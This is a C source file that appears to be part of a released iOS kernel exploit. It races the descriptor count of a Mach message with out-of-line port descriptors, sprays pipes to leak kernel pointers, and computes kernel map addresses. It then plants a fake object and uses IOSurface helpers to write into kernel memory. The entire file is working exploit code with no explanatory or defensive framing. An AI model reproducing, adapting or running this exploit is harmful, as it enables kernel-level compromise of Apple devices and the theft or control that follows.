//
//  desc_race.c
//  desc_race_release
//
//  Created by b1n4r1b01 on 01/03/22.
//

#include "desc_race.h"
#include <mach/message.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pthread.h>
#include <unistd.h>
#include "spray_stuff.h"


int exec = 0;
const uint32_t ass_desc_cnt = 1;

typedef struct {
    mach_msg_header_t           header;
    mach_msg_body_t             body;
    mach_msg_ool_descriptor_t   ool_d[ass_desc_cnt];
}assistant_msg_t;

const int race_desc_cnt = 3;
typedef struct {
    mach_msg_header_t               header;
    mach_msg_body_t                 body;
    mach_msg_ool_ports_descriptor_t ool_pd[race_desc_cnt];
//    mach_msg_ool_descriptor_t       ool_d[1];
    char                        a[0x2000/1];
}oolp_msg_t;


oolp_msg_t race_msg = {0};
oolp_msg_t *recv_msg = {0};
mach_port_t race_port = 0;
uint32_t recv_sz = 0;

void race_desc(void)
{
    printf("starting race\n");
    while(1){
        while(!exec);
        
        printf("");
        race_msg.body.msgh_descriptor_count = 0xFB;
        exec = 0;
    }
}


void do_leak_race(void)
{

    uint32_t port_alloc_sz = 0x8008; //0x4000
    uint32_t port_count = port_alloc_sz / 8;
    uint32_t port_desc_sz = port_count * sizeof(mach_port_t);
    void *port_desc = malloc(port_desc_sz);
    memset(port_desc, 0, port_desc_sz);
    
    uint32_t port_count2 = 0x8008 / 8;
    uint32_t port_desc2_sz = port_count2 * sizeof(mach_port_t);
    void *port_desc2 = malloc(port_desc2_sz);

//    uint32_t port_count3 = 0x13f00 / 8;
//    uint32_t port_desc3_sz = port_count3 * sizeof(mach_port_t);
//    void *port_desc3 = malloc(port_desc3_sz);
//    memset(port_desc3, 0, port_desc3_sz);
//
//    uint32_t port_count4 = 0x13f00 / 8;
//    uint32_t port_desc4_sz = port_count4 * sizeof(mach_port_t);
//    void *port_desc4 = malloc(port_desc4_sz);
//    memset(port_desc4, 0, port_desc4_sz);
    
    pthread_t th1;
    pthread_create(&th1, NULL, (void*)race_desc, NULL);
    sleep(1);

    
//    while(1)
    {
    kern_return_t ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &race_port);
    if (ret){
        printf("failed to allocate send mach_port 0x%X\n", ret);
        return;
    }

    
    race_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    race_msg.header.msgh_remote_port = race_port;
    race_msg.header.msgh_size = sizeof(oolp_msg_t);
    race_msg.header.msgh_id = 0x41414141;
    race_msg.body.msgh_descriptor_count = race_desc_cnt;
        
    race_msg.ool_pd[0].address = port_desc;
    race_msg.ool_pd[0].count = port_count;
    race_msg.ool_pd[0].deallocate = 0;
    race_msg.ool_pd[0].copy = MACH_MSG_PHYSICAL_COPY;
    race_msg.ool_pd[0].disposition = MACH_MSG_TYPE_MAKE_SEND;
    race_msg.ool_pd[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        
    race_msg.ool_pd[1].address = port_desc;
    race_msg.ool_pd[1].count = port_count;
    race_msg.ool_pd[1].deallocate = 0;
    race_msg.ool_pd[1].copy = MACH_MSG_PHYSICAL_COPY;
    race_msg.ool_pd[1].disposition = MACH_MSG_TYPE_MAKE_SEND;
    race_msg.ool_pd[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    
    race_msg.ool_pd[2].address = port_desc2;
    race_msg.ool_pd[2].count = port_count2;
    race_msg.ool_pd[2].deallocate = 0;
    race_msg.ool_pd[2].copy = MACH_MSG_PHYSICAL_COPY;
    race_msg.ool_pd[2].disposition = MACH_MSG_TYPE_MAKE_SEND;
    race_msg.ool_pd[2].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        
//    race_msg.ool_pd[3].address = port_desc;
//    race_msg.ool_pd[3].count = port_count;
//    race_msg.ool_pd[3].deallocate = 0;
//    race_msg.ool_pd[3].copy = MACH_MSG_PHYSICAL_COPY;
//    race_msg.ool_pd[3].disposition = MACH_MSG_TYPE_MAKE_SEND;
//    race_msg.ool_pd[3].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

//    race_msg.ool_d[0].address = some_mem;
//    race_msg.ool_d[0].size    = some_mem_sz;
//    race_msg.ool_d[0].type    = MACH_MSG_OOL_DESCRIPTOR;
//    race_msg.ool_d[0].copy    = 0;    // we can only use 0 and 1
//    race_msg.ool_d[0].deallocate = 0;

    exec = 1;
    ret = mach_msg((mach_msg_header_t*)&race_msg, MACH_SEND_MSG, race_msg.header.msgh_size, 0, 0, 0, 0);
    if(ret){
            printf("failed to send race message 0x%X %s\n", ret, mach_error_string(ret));
            return;
    }
    
    recv_sz = sizeof(oolp_msg_t) + 0x20;
    recv_msg = malloc(recv_sz);
    bzero(recv_msg, recv_sz);
    recv_msg->header.msgh_size = recv_sz;
    }
}

#define D64(a, o) *(uint64_t*)(a + o)
#define D32(a, o) *(uint32_t*)(a + o)


void after_hang(void){
    sleep(1);
    yeet_ios();
}


#define MB(a) (a * 1024 * 1024)

void take1(void)
{

    struct rlimit limit = {0};
    getrlimit(RLIMIT_NOFILE, &limit);
    limit.rlim_cur = 1000;
    setrlimit(RLIMIT_NOFILE, &limit);

    void *leak_pipe = 0;
    while (!leak_pipe)
    {
        int race_success_pipe_cnt = 200;

        pipe_spray_adv(0x4000, race_success_pipe_cnt);

        do_leak_race();

        int dat_pipe = -1;
        leak_pipe = read_pipes(0x4000, &dat_pipe);
        if (!leak_pipe){
            printf("leak failed\n");

            sleep(1);
            continue;
        }
        close_pipes_except(dat_pipe);
        uint64_t leak_msg = (uint64_t)leak_pipe + 0x3c14 + (8 * race_desc_cnt);

        uint64_t first_klm_ptr = 0;
        void *leak_ptr_buf = malloc(race_desc_cnt * 8);
        for (int i = 1; i <= race_desc_cnt; i++){
            uint64_t leak_ptr = D64(leak_msg, 0x24 + (0x10 * (i - 1)));
            if (i == 1)
                first_klm_ptr = leak_ptr;
            *(uint64_t*)(leak_ptr_buf + ((i - 1) * 8)) = leak_ptr;
        }
        uint64_t last_klm_ptr = 0;
        bool is_last_kptr_in_klm = false;
        for (int i = race_desc_cnt; i >= 1; i--){
            uint64_t ptr = *(uint64_t*)(leak_ptr_buf + ((i - 1) * 8));
            uint8_t map = ptr >> (8 * 4) & 0xFF;
            if (map == 0xE6){
                last_klm_ptr = ptr;
                if (i == race_desc_cnt)
                    is_last_kptr_in_klm = true;
                break;
            }
        }


        uint64_t klm_start = first_klm_ptr - MB(2.75);
        uint64_t krldm_start = klm_start + MB(98);
        printf("last klm ptr: 0x%llX\n", last_klm_ptr);

        uint64_t final = krldm_start + MB(40) + MB(900);
        printf("fake obj: 0x%llX\n", final);
//        uint64_t remote_port_ptr = *(uint64_t*)(leak_msg + 0x8);
        *(uint64_t*)(leak_msg + 0x34) = final;
        *(uint8_t*)(leak_msg + 0x3F)  = 1;
        uint64_t write_ptr = first_klm_ptr - 0x10000;
        printf("writing to: 0x%llX\n", write_ptr);
        iosurface_justin_ptr(1024 * 1024, final, write_ptr, write_ptr);
        wirte_to_pipe(dat_pipe, leak_pipe, 0x4000);

        pthread_t th2 = NULL;
        pthread_create(&th2, 0, (void*)after_hang, 0);

        sleep(1);
        mach_port_destroy(mach_task_self(), race_port);
        printf("why so serious?\n");
        while(1);
    }

}


void desc_race(void)
{
    iosurface_stuff();
    sleep(1);
    take1();
}
